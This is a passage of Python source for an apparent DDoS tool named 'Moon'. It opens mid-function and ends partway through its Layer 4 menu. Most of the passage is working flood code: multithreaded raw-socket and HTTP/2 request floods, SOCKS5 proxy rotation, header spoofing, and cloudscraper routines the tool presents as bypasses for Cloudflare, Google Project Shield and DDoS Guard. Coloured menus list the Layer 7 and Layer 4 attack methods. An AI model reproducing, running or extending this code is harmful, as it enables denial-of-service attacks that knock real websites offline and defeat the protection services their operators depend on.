if target['scheme'] == 'https':
    s = socks.socksocket()
    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    s.connect((str(target['host']), int(target['port'])))
    s = ssl.create_default_context().wrap_socket(
        s,
        server_hostname=target['host']
    )
else:
    s = socks.socksocket()
    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    s.connect((str(target['host']), int(target['port'])))

while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
    try:
        try:
            for _ in range(100):
                s.send(str.encode("GET / HTTP/1.1\r\n\r\n"))
        except:
            s.close()
    except:
        pass


def LaunchNULL(url, th, t):
    target = get_target(url)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    req =  "GET "+target['uri']+" HTTP/1.1\r\nHost: " + target['host'] + "\r\n"
    req += "User-Agent: null\r\n"
    req += "Referrer: null\r\n"
    req += spoof(target) + "\r\n"
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackNULL, args=(target, until, req))
            thd.start()
        except:
            pass

def AttackNULL(target, until_datetime, req):
    if target['scheme'] == 'https':
        s = socks.socksocket()
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect((str(target['host']), int(target['port'])))
        s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
    else:
        s = socks.socksocket()
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect((str(target['host']), int(target['port'])))
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            try:
                for _ in range(100):
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            pass

def LaunchSPOOF(url, th, t):
    target = get_target(url)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    req =  "GET "+target['uri']+" HTTP/1.1\r\nHost: " + target['host'] + "\r\n"
    req += "User-Agent: " + random.choice(ua) + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n"
    req += spoof(target)
    req += "Connection: Keep-Alive\r\n\r\n"
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackSPOOF, args=(target, until, req))
            thd.start()
        except:
            pass

def AttackSPOOF(target, until_datetime, req):
    if target['scheme'] == 'https':
        s = socks.socksocket()
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect((str(target['host']), int(target['port'])))
        s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
    else:
        s = socks.socksocket()
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect((str(target['host']), int(target['port'])))
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            try:
                for _ in range(100):
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            pass

def LaunchPXSPOOF(url, th, t, proxy):
    target = get_target(url)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    req =  "GET "+target['uri']+" HTTP/1.1\r\nHost: " + target['host'] + "\r\n"
    req += "User-Agent: " + random.choice(ua) + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n"
    req += spoof(target)
    req += "Connection: Keep-Alive\r\n\r\n"
    for _ in range(int(th)):
        try:
            randomproxy = random.choice(proxy)
            thd = threading.Thread(target=AttackPXSPOOF, args=(target, until, req, randomproxy))
            thd.start()
        except:
            pass

def AttackPXSPOOF(target, until_datetime, req, proxy):
    proxy = proxy.split(":")
    print(proxy)
    try:
        if target['scheme'] == 'https':
            s = socks.socksocket()
            s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            s.connect((str(target['host']), int(target['port'])))
            s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
        else:
            s = socks.socksocket()
            s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            s.connect((str(target['host']), int(target['port'])))
    except:
        return
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            try:
                for _ in range(100):
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            pass

def LaunchCFB(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    scraper = cloudscraper.create_scraper()
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackCFB, args=(url, until, scraper))
            thd.start()
        except:
            pass

def AttackCFB(url, until_datetime, scraper):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            scraper.get(url, timeout=15)
            scraper.get(url, timeout=15)
        except:
            pass

def LaunchPXCFB(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    scraper = cloudscraper.create_scraper()
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackPXCFB, args=(url, until, scraper))
            thd.start()
        except:
            pass

def AttackPXCFB(url, until_datetime, scraper):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            proxy = {
                    'http': 'http://'+str(random.choice(list(proxies))),   
                    'https': 'http://'+str(random.choice(list(proxies))),
            }
            scraper.get(url, proxies=proxy)
            scraper.get(url, proxies=proxy)
        except:
            pass

def LaunchCFPRO(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    session = requests.Session()
    scraper = cloudscraper.create_scraper(sess=session)
    jar = RequestsCookieJar()
    jar.set(cookieJAR['name'], cookieJAR['value'])
    scraper.cookies = jar
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackCFPRO, args=(url, until, scraper))
            thd.start()
        except:
            pass

def AttackCFPRO(url, until_datetime, scraper):
    headers = {
        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'TE': 'trailers',
    }
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            scraper.get(url=url, headers=headers, allow_redirects=False)
            scraper.get(url=url, headers=headers, allow_redirects=False)
        except:
            pass

def LaunchCFSOC(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    target = get_target(url)
    req =  'GET '+ target['uri'] +' HTTP/1.1\r\n'
    req += 'Host: ' + target['host'] + '\r\n'
    req += 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'
    req += 'Accept-Encoding: gzip, deflate, br\r\n'
    req += 'Accept-Language: en-US,en;q=0.9\r\n'
    req += 'Cache-Control: max-age=0\r\n'
    req += 'Cookie: ' + cookie + '\r\n'
    req += f'sec-ch-ua: "Chromium";v="100", "Google Chrome";v="100"\r\n'
    req += 'sec-ch-ua-mobile: ?0\r\n'
    req += 'sec-ch-ua-platform: "Windows"\r\n'
    req += 'sec-fetch-dest: empty\r\n'
    req += 'sec-fetch-mode: cors\r\n'
    req += 'sec-fetch-site: same-origin\r\n'
    req += 'Connection: Keep-Alive\r\n'
    req += 'User-Agent: ' + useragent + '\r\n\r\n\r\n'
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackCFSOC,args=(until, target, req,))
            thd.start()
        except:  
            pass

def AttackCFSOC(until_datetime, target, req):
    if target['scheme'] == 'https':
        packet = socks.socksocket()
        packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        packet.connect((str(target['host']), int(target['port'])))
        packet = ssl.create_default_context().wrap_socket(packet, server_hostname=target['host'])
    else:
        packet = socks.socksocket()
        packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        packet.connect((str(target['host']), int(target['port'])))
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            for _ in range(10):
                packet.send(str.encode(req))
        except:
            packet.close()
            pass

def attackSKY(url, timer, threads):
    for i in range(int(threads)):
        threading.Thread(target=LaunchSKY, args=(url, timer)).start()

def LaunchSKY(url, timer):
    proxy = random.choice(proxies).strip().split(":")
    timelol = time.time() + int(timer)
    req =  "GET / HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
    req += "Cache-Control: no-cache\r\n"
    req += "User-Agent: " + random.choice(ua) + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n"
    req += "Sec-Fetch-Site: same-origin\r\n"
    req += "Sec-GPC: 1\r\n"
    req += "Sec-Fetch-Mode: navigate\r\n"
    req += "Sec-Fetch-Dest: document\r\n"
    req += "Upgrade-Insecure-Requests: 1\r\n"
    req += "Connection: Keep-Alive\r\n\r\n"
    while time.time() < timelol:
        try:
            s = socks.socksocket()
            s.connect((str(urlparse(url).netloc), int(443)))
            s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            ctx = ssl.SSLContext()
            s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
            s.send(str.encode(req))
            try:
                for _ in range(100):
                    s.send(str.encode(req))
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            s.close()

def attackSTELLAR(url, timer, threads):
    for i in range(int(threads)):
        threading.Thread(target=LaunchSTELLAR, args=(url, timer)).start()

def LaunchSTELLAR(url, timer):
    timelol = time.time() + int(timer)
    req =  "GET / HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
    req += "Cache-Control: no-cache\r\n"
    req += "User-Agent: " + random.choice(ua) + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n"
    req += "Sec-Fetch-Site: same-origin\r\n"
    req += "Sec-GPC: 1\r\n"
    req += "Sec-Fetch-Mode: navigate\r\n"
    req += "Sec-Fetch-Dest: document\r\n"
    req += "Upgrade-Insecure-Requests: 1\r\n"
    req += "Connection: Keep-Alive\r\n\r\n"
    while time.time() < timelol:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((str(urlparse(url).netloc), int(443)))
            ctx = ssl.create_default_context()
            s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
            s.send(str.encode(req))
            try:
                for _ in range(100):
                    s.send(str.encode(req))
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            s.close()

def LaunchHTTP2(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        threading.Thread(target=AttackHTTP2, args=(url, until)).start()

def AttackHTTP2(url, until_datetime):
    headers = {
            'User-Agent': random.choice(ua),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'TE': 'trailers',
            }
    client = httpx.Client(http2=True)
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            client.get(url, headers=headers)
            client.get(url, headers=headers)
        except:
            pass

def LaunchPXHTTP2(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        threading.Thread(target=AttackPXHTTP2, args=(url, until)).start()

def AttackPXHTTP2(url, until_datetime):
    headers = {
            'User-Agent': random.choice(ua),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'TE': 'trailers',
            }
    
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            client = httpx.Client(
                http2=True,
                proxies={
                    'http': 'http://'+random.choice(proxies),
                    'https': 'http://'+random.choice(proxies),
                }
             )
            client.get(url, headers=headers)
            client.get(url, headers=headers)
        except:
            pass

def test1(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    target = get_target(url)
    req =  'GET '+ target['uri'] +' HTTP/1.1\r\n'
    req += 'Host: ' + target['host'] + '\r\n'
    req += 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'
    req += 'Accept-Encoding: gzip, deflate, br\r\n'
    req += 'Accept-Language: en-US,en;q=0.9\r\n'
    req += 'Cache-Control: max-age=0\r\n'
    req += f'sec-ch-ua: "Chromium";v="100", "Google Chrome";v="100"\r\n'
    req += 'sec-ch-ua-mobile: ?0\r\n'
    req += 'sec-ch-ua-platform: "Windows"\r\n'
    req += 'sec-fetch-dest: empty\r\n'
    req += 'sec-fetch-mode: cors\r\n'
    req += 'sec-fetch-site: same-origin\r\n'
    req += 'Connection: Keep-Alive\r\n'
    req += 'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en\r\n\r\n\r\n'
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=test2,args=(until, target, req,))
            thd.start()
        except:  
            pass

def test2(until_datetime, target, req):
    if target['scheme'] == 'https':
        packet = socks.socksocket()
        packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        packet.connect((str(target['host']), int(target['port'])))
        packet = ssl.create_default_context().wrap_socket(packet, server_hostname=target['host'])
    else:
        packet = socks.socksocket()
        packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        packet.connect((str(target['host']), int(target['port'])))
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            for _ in range(10):
                packet.send(str.encode(req))
        except:
            packet.close()
            pass

def clear(): 
    if name == 'nt': 
        system('cls')
    else: 
        system('clear')

def help():
    clear()
    stdout.write("\n" * 4)
    stdout.write("\x1b[90m" + " " * 140 + "\x1b[0m\n")  # Fondo gris oscuro suave
    stdout.write("\x1b[90m╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗\x1b[0m\n")
    stdout.write("\x1b[38;2;255;100;100m║                                                                                                                                                                                                                                              ║\x1b[0m\n")
    stdout.write("\x1b[38;2;255;150;150m║                                                                                                           Moon - MAIN MENU  By Dull                                                                                                         ║\x1b[0m\n")
    stdout.write("\x1b[38;2;255;200;200m║                                                                                                                                                                                                                                              ║\x1b[0m\n")
    stdout.write("\x1b[90m╠══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣\x1b[0m\n")

    # Layer 7 izquierda + Layer 4 derecha
    left_layer7 = [
        "║       LAYER 7 ATTACKS                    ║",
        "║ • cfb       → Bypass Cloudflare          ║",
        "║ • pxcfb     → CF with Proxy              ║",
        "║ • cfreq     → CF UAM/CAPTCHA (request)   ║",
        "║ • cfsoc     → CF UAM/CAPTCHA (socket)    ║",
        "║ • pxsky     → Google Shield / DDoS Guard ║",
        "║ • sky       → Sky no proxy               ║",
        "║ • http2     → HTTP/2 Flood               ║",
        "║ • pxhttp2   → HTTP/2 with Proxy          ║",
        "║ • get       → GET Flood                  ║",
        "║ • post      → POST Flood                 ║",
        "║ • head      → HEAD Flood                 ║",
        "║ • pps       → Pure PPS                   ║",
        "║ • spoof     → Spoof Socket               ║",
        "║ • pxspoof   → Spoof with Proxy           ║",
        "║ • soc       → Socket Attack              ║",
        "║ • pxraw     → Proxy RAW                  ║",
        "║ • pxsoc     → Proxy Socket               ║",
        "║                                          ║",
        "║                                          ║",
        "║                                          ║",
        "║                                          ║",
        "║                                          ║",
        "║                                          ║",
        "║                                          ║",
        "║                                          ║",
        "║                                          ║",
        "║                                          ║",
        "║                                          ║",
        "║                                          ║",
        "║                                          ║",
        "║                                          ║",
        "║                                          ║",
        "║                                          ║",
        "║                                          ║",
        "║                                          ║",
        "║                                          ║",
        "║                                          ║",
        "║                                          ║",
        "║                                          ║",
        "║                                          ║",
        "║                                          ║",
        "║                                          ║",
        "║                                          ║"

    ]

#      "║                                          ║",

    right_layer4 = [
        "                     ██████████████████████████████████████████████████▓▓▒▒▓▓████████████████████████████████████████████████                                ║     LAYER 4 ATTACKS     ║",  
        "                     ██████████████████████████████████████████████▓▓▓▓▒▒▒▒▒▒▓▓██████████████████████████████████████████████                                ║ • udp       → UDP Flood ║",
        "                     █████████████████████████████████████████████▓▓▒▒▒▒▒▒▒▒▒▒███████████████████████████████████████████████                                ║ • tcp       → TCP Flood ║",
        "                     ████████████████████████████████████████████▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒████████████████████████████████████████████                                ║                         ║",
        "                     ████████████████████████████████████████████▒▒░░▒▒▒▒▒▒▒▒▒▒  ████████████████████████████████████████████                                ║                         ║",
        "                     ██████████████████████████████████████████                ░░  ██████████████████████████████████████████                                ║                         ║",
        "                     ██████████████████████████████████████████                  ░░██████████████████████████████████████████                                ║                         ║",
        "                     ██████████████████████████████████████████        ░░░░    ░░  ██████████████████████████████████████████                                ║                         ║",
        "                     ████████████████████████████████████████        ░░░░  ░░    ░░  ████████████████████████████████████████                                ║                         ║",
        "                     ████████████████████████████████████████        ░░  ░░  ░░░░  ░░████████████████████████████████▓▓██████                                ║                         ║",
        "                     ████████████████████████████████████████        ░░░░░░░░░░      ████████████████████████████████▓▓██████                                ║                         ║",
        "                     ██████████████████████████████████████░░          ░░░░░░        ░░████████████████████████████  ████████                                ║                         ║",
        "                     ██████████████████████████████████████              ░░░░      ░░  ▓▓████████████████████████  ██  ▒▒████                                ║                         ║",
        "                     ██████████████████████████████████████                  ░░░░    ░░██████████████████████████  ██  ▒▒████                                ║                         ║",
        "                     ██████████████████████████████████████                  ░░░░    ░░████████████████████████████  ████████                                ║                         ║",
        "                     ██████████████████████████████████████            ░░  ░░  ░░░░░░  ██████████████████████████████████████                                ║                         ║",
        "                     ██████████████████████████████████████              ░░░░    ░░    ██████████████████████████████████████                                ║                         ║",
        "                     ██████████████████████████████████████            ░░░░░░    ░░  ░░██████████████████████████████████████                                ║                         ║",
        "                     ██████████████████████████████████████                        ░░░░██████████████████████████████████████                                ║                         ║",
        "                     ██████████████████████████████████████▒▒            ▒▒      ░░  ▒▒██████████████████████████████████████                                ║                         ║",
        "                     ████░░░░████████████████████████████▒▒▒▒            ▒▒        ░░▒▒▒▒████████████████████████████████████                                ║                         ║",
        "                     ██  ▓▓▓▓  ████████████████████████▒▒▒▒▒▒          ▒▒▒▒▒▒    ░░░░▒▒▒▒▒▒██████████████████████████████████                                ║                         ║",
        "                     ██  ████  ██████████████████████▒▒▒▒▒▒▒▒▒▒        ▒▒▒▒▒▒░░░░░░▒▒▒▒▒▒▒▒▒▒████████████████████████████████                                ║                         ║",
        "                     ████    ████████████████████████▒▒▒▒▒▒▒▒████▒▒    ▒▒▒▒▒▒  ░░████▒▒▒▒▒▒▒▒████████████████████████████████                                ║                         ║",
        "                     ████▓▓▓▓██████████████████████▒▒▒▒▒▒████████▒▒    ▒▒▒▒▒▒░░░░████████▒▒▒▒▒▒██████████████████████████████                                ║                         ║",
        "                     ██████████████████████████████▒▒██████████████▓▓▒▒▒▒▒▒▒▒▒▒██████████████▒▒██████████████████████████████                                ║                         ║",
        "                                                                                                                                                             ║                         ║",
        "                                                                                                                                                             ║                         ║",
        "                                                                                                                                                             ║                         ║",
        "                                                                                                                                                             ║                         ║",
        "                                                                                                                                                             ║                         ║",
        "                                                                                                                                                             ║                         ║",
        "                                                                                                                                                             ║                         ║",
        "                                                                                                                                                             ║                         ║",
        "                                                                                                                                                             ║                         ║",
        "                                                                                                                                                             ║                         ║",
        "                                                                                                                                                             ║                         ║",
        "                                                                                                                                                             ║                         ║",
        "                                                                                                                                                             ║                         ║",
        "                                                                                                                                                             ║                         ║",
        "                                                                                                                                                             ║                         ║",
        "                                                                                                                                                             ║                         ║",
        "                                                                                                                                                             ║                         ║",
        "                                                                                                                                                             ║                         ║"

    ]

    max_lines = max(len(left_layer7), len(right_layer4))
    for i in range(max_lines):
        l7 = left_layer7[i] if i < len(left_layer7) else ""
        l4 = right_layer4[i] if i < len(right_layer4) else ""

        color_l7 = f"\x1b[38;2;255;{max(50, 255 - i*12)};{max(50, 255 - i*12)}m"
        color_l4 = f"\x1b[38;2;{100 + i*10};{200 - i*10};255m"

        line = f"{color_l7}{l7:<55} {color_l4}{l4:<55}\x1b[0m"
        stdout.write(line.center(140) + "\n")

    stdout.write("\x1b[90m╠══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣\x1b[0m\n")

    stdout.write("\x1b[38;2;100;255;100m║  TOOLS & EXTRAS                                                                                                                                                                                                                              ║\x1b[0m\n")
    stdout.write("\x1b[38;2;100;255;150m║  • dns       → Classic DNS Lookup                                                                                                                                                                                                            ║\x1b[0m\n")
    stdout.write("\x1b[38;2;100;255;200m║  • geoip     → Geo IP Address Lookup                                                                                                                                                                                                         ║\x1b[0m\n")
    stdout.write("\x1b[38;2;100;255;255m║  • subnet    → Subnet IP Address Lookup                                                                                                                                                                                                      ║\x1b[0m\n")
    stdout.write("\x1b[38;2;150;255;255m║  • clear/cls → Clear console                                                                                                                                                                                                                 ║\x1b[0m\n")
    stdout.write("\x1b[38;2;200;255;255m║  • exit      → Exit Moon Attack                                                                                                                                                                                                             ║\x1b[0m\n")
    stdout.write("\x1b[38;2;255;255;255m║  • credit    → Show credits                                                                                                                                                                                                                  ║\x1b[0m\n")

    stdout.write("\x1b[90m╚═════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝\x1b[0m\n")
    stdout.write("\x1b[38;2;255;200;100mType any method (cfb, get, udp, dns, geoip, etc.) or command (clear, exit, credit) to start.\x1b[0m\n")
    stdout.write("\n")

def credit():
    stdout.write("\x1b[38;2;0;236;250m════════════════════════╗\n")
    stdout.write("\x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX   +"Developer "+Fore.RED+": \x1b[38;2;0;255;189mm00n_.dull\n")
    stdout.write("\x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX   +"UI Design "+Fore.RED+": \x1b[38;2;0;255;189mm00n_.dull\n")
    stdout.write("\x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX   +"Methods/Tools "+Fore.RED+": \x1b[38;2;0;255;189mm00n_.dull\n")
    stdout.write("\x1b[38;2;0;236;250m════════════════════════╝\n")
    stdout.write("\n")    

def layer7():
    clear()
    stdout.write("                                                                                         \n")
    stdout.write("                                 "+Fore.LIGHTWHITE_EX   +"╦  ╔═╗╦ ╦╔═╗╦═╗ ══╗             \n")
    stdout.write("                                 "+Fore.LIGHTRED_EX    +"║  ╠═╣╚╦╝║╣ ╠╦╝  ╔╝             \n")
    stdout.write("                                 "+Fore.LIGHTRED_EX    +"╩═╝╩ ╩ ╩ ╚═╝╩╚═  ╩              \n")
    stdout.write("             "+Fore.LIGHTRED_EX            +"        ══╦═════════════════════════════════╦══\n")
    stdout.write("            "+Fore.LIGHTRED_EX            +"╔══════════╩═════════════════════════════════╩═════════╗\n")
    stdout.write("            "+Fore.LIGHTRED_EX            +"║ "+Fore.WHITE+"cfb     "+Fore.LIGHTRED_EX+" | "+Fore.WHITE+"Bypass Cloudflare Attack                  "+Fore.LIGHTRED_EX+"║\n")
    stdout.write("            "+Fore.LIGHTRED_EX            +"║ "+Fore.WHITE+"pxcfb   "+Fore.LIGHTRED_EX+" | "+Fore.WHITE+"Bypass Cloudflare with Proxy              "+Fore.LIGHTRED_EX+"║\n")
    stdout.write("            "+Fore.LIGHTRED_EX            +"║ "+Fore.WHITE+"cfreq   "+Fore.LIGHTRED_EX+" | "+Fore.WHITE+"Bypass CF UAM, CAPTCHA, BFM (request)     "+Fore.LIGHTRED_EX+"║\n")
    stdout.write("            "+Fore.LIGHTRED_EX            +"║ "+Fore.WHITE+"cfsoc   "+Fore.LIGHTRED_EX+" | "+Fore.WHITE+"Bypass CF UAM, CAPTCHA, BFM (socket)      "+Fore.LIGHTRED_EX+"║\n")
    stdout.write("            "+Fore.LIGHTRED_EX            +"║ "+Fore.WHITE+"pxsky   "+Fore.LIGHTRED_EX+" | "+Fore.WHITE+"Bypass Google Project Shield, DDoS Guard, "+Fore.LIGHTRED_EX+"║\n")
    stdout.write("            "+Fore.LIGHTRED_EX            +"║ "+Fore.WHITE+"        "+Fore.LIGHTRED_EX+" | "+Fore.WHITE+"CF NoSec with Proxy                       "+Fore.LIGHTRED_EX+"║\n")
    stdout.write("            "+Fore.LIGHTRED_EX            +"║ "+Fore.WHITE+"sky     "+Fore.LIGHTRED_EX+" | "+Fore.WHITE+"Sky method without proxy                  "+Fore.LIGHTRED_EX+"║\n")
    stdout.write("            "+Fore.LIGHTRED_EX            +"║ "+Fore.WHITE+"http2   "+Fore.LIGHTRED_EX+" | "+Fore.WHITE+"HTTP 2.0 Request Attack                   "+Fore.LIGHTRED_EX+"║\n")
    stdout.write("            "+Fore.LIGHTRED_EX            +"║ "+Fore.WHITE+"pxhttp2 "+Fore.LIGHTRED_EX+" | "+Fore.WHITE+"HTTP 2.0 Request Attack with Proxy        "+Fore.LIGHTRED_EX+"║\n")
    stdout.write("            "+Fore.LIGHTRED_EX            +"║ "+Fore.WHITE+"get     "+Fore.LIGHTRED_EX+" | "+Fore.WHITE+"Get Request Attack                        "+Fore.LIGHTRED_EX+"║\n")
    stdout.write("            "+Fore.LIGHTRED_EX            +"║ "+Fore.WHITE+"post    "+Fore.LIGHTRED_EX+" | "+Fore.WHITE+"Post Request Attack                       "+Fore.LIGHTRED_EX+"║\n")
    stdout.write("            "+Fore.LIGHTRED_EX            +"║ "+Fore.WHITE+"head    "+Fore.LIGHTRED_EX+" | "+Fore.WHITE+"Head Request Attack                       "+Fore.LIGHTRED_EX+"║\n")
    stdout.write("            "+Fore.LIGHTRED_EX            +"║ "+Fore.WHITE+"pps     "+Fore.LIGHTRED_EX+" | "+Fore.WHITE+"Only GET / HTTP/1.1                       "+Fore.LIGHTRED_EX+"║\n")
    stdout.write("            "+Fore.LIGHTRED_EX            +"║ "+Fore.WHITE+"spoof   "+Fore.LIGHTRED_EX+" | "+Fore.WHITE+"HTTP Spoof Socket Attack                  "+Fore.LIGHTRED_EX+"║\n")
    stdout.write("            "+Fore.LIGHTRED_EX            +"║ "+Fore.WHITE+"pxspoof "+Fore.LIGHTRED_EX+" | "+Fore.WHITE+"HTTP Spoof Socket Attack with Proxy       "+Fore.LIGHTRED_EX+"║\n")
    stdout.write("            "+Fore.LIGHTRED_EX            +"║ "+Fore.WHITE+"soc     "+Fore.LIGHTRED_EX+" | "+Fore.WHITE+"Socket Attack                             "+Fore.LIGHTRED_EX+"║\n")
    stdout.write("            "+Fore.LIGHTRED_EX            +"║ "+Fore.WHITE+"pxraw   "+Fore.LIGHTRED_EX+" | "+Fore.WHITE+"Proxy Request Attack                      "+Fore.LIGHTRED_EX+"║\n")
    stdout.write("            "+Fore.LIGHTRED_EX            +"║ "+Fore.WHITE+"pxsoc   "+Fore.LIGHTRED_EX+" | "+Fore.WHITE+"Proxy Socket Attack                       "+Fore.LIGHTRED_EX+"║\n")
    stdout.write("            "+Fore.LIGHTRED_EX            +"╚══════════════════════════════════════════════════════╝\n")
    stdout.write("\n")

def layer4():
    clear()
    stdout.write("                                                                                         \n")
    stdout.write("                                 "+Fore.LIGHTWHITE_EX   +"╦  ╔═╗╦ ╦╔═╗╦═╗ ╦ ╦             \n")
    stdout.write("                                 "+Fore.LIGHTRED_EX    +"║  ╠═╣╚╦╝║╣ ╠╦╝ ╚═╣             \n")
    stdout.write("                                 "+Fore.LIGHTRED_EX    +"╩═╝╩ ╩ ╩ ╚═╝╩╚═   ╩              \n")
    stdout.write("             "+Fore.LIGHTRED_EX            +"        ══╦═════════════════════════════════╦══\n")
    stdout.write("             "+Fore.LIGHTRED_EX            +"╔═════════╩═════════════════════════════════╩═════════╗\n")
    stdout.write("             "+Fore.LIGHTRED_EX            +"║ "+Fore.WHITE+"udp   "+Fore.LIGHTRED_EX+" | "+Fore.WHITE+"UDP Attack                                "+Fore.LIGHTRED_EX+"║\n")
